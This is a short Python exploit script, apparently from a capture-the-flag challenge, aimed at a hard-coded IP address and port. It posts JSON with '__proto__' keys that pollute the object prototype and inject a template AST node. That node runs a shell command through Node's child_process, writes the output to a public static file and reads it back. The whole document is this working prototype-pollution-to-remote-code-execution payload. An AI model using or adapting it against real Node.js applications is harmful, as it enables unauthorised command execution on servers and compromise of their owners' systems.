import requests

TARGET_URL = 'http://46.101.23.188:30303/'

# make pollution
r = requests.post(TARGET_URL+'/api/submit', json = {
    "artist.name":"Westaway",
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync(`whoami > /app/static/out`)"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
    })

print(r.status_code)
print(r.text)

print(requests.get(TARGET_URL+'/static/out').text)